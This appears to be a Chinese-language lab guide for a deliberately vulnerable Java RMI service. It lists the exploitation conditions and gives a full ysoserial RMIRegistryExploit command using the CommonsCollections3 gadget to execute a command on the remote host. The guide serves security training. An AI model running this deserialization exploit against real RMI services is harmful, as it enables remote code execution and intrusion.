### 漏洞环境
> 本环境在本地开启了一个RMI服务,正常的客户端可以`java -cp RMIDemo.jar com.firestar.demotwo.HelloClient {{ip}} {{port[0]}}`可以调用远程JAVA对象.

> 程序源码在/root/RMIDemo.tar.gz

## 利用条件
> 1.存在反序列化传输

> 2.存在有缺陷的第三方库如commons-collections

## 漏洞复现

下载利用工具

> [ysoserial](http://{{ip}}:{{webport}}/vuln/rmi/ysoserial-0.0.5-SNAPSHOT-all.jar)

利用漏洞在远程服务器上执行 `touch /tmp/test` 命令

> `java -cp ysoserial-0.0.5-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit {{ip}} {{port[0]}} CommonsCollections3 "touch /tmp/test"`

## 参考资料
[java RMI相关反序列化漏洞整合分析](http://wooyun.jozxing.cc/static/drops/papers-13056.html)

